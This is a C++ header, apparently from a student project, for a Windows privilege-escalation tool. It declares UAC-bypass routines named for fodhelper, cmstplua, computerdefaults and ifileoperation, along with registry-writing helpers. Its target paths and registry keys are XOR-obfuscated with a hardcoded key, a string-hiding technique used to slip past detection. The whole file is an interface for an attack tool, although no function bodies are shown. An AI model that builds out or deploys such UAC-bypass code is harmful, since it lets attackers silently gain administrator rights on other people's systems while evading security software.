/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   privesc.hpp                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/08/24 02:18:02 by zcadinot          #+#    #+#             */
/*   Updated: 2026/08/24 02:42:59 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <windows.h>
#include <stdio.h>
#include <iostream>

#define XOR_KEY "X7!qP2#vL9@kR4$zN8&mT1^cW6*eH3_yD5+uF0=sJ7?bA2%gK9"

#define FHELPER "\x1B\x0D\x0E\x26\x39\x5C\x47\x19\x3B\x4A\x6F\x38\x2B\x47\x50\x1F\x23\x0B\x14\x42\x32\x5E\x3A\x0B\x32\x5A\x5A\x00\x3A\x1D\x3A\x01\x21"
#define CDDEFAULTS "\x1B\x0D\x0E\x26\x39\x5C\x47\x19\x3B\x4A\x6F\x38\x2B\x47\x50\x1F\x23\x0B\x14\x42\x37\x5E\x33\x13\x22\x42\x4F\x17\x2C\x56\x39\x18\x31\x59\x5F\x06\x68\x55\x45\x16"

enum method
{
    RUNAS,
    FODHELPER,
    CMSTPLUA,
    COMPUTERDEFAULTS
};

bool elevate_privileges(method meto);
bool is_admin();
char *get_myh_path(void);

bool elevate_runas();

#define path_reg "\x0B\x58\x47\x05\x27\x53\x51\x13\x10\x7A\x2C\x0A\x21\x47\x41\x09\x12\x55\x55\x40\x27\x54\x2A\x17\x3E\x58\x4D\x16\x14\x60\x37\x1C\x28\x59\x77\x3A\x36\x55\x53\x2F\x29\x58\x52\x0F\x20\x5C\x41"
bool elevate_fodhelper();

bool elevate_cmstplua();

bool elevate_ifileoperation();

bool elevate_computerdefaults();

int create_key(const char *path);
int set_value(const char *path, const char *name, const char *data);
int open_key(const char *path, HKEY *out);

std::string key_xor(const std::string &str, const std::string &key);
void	print_encrypted(const std::string &str);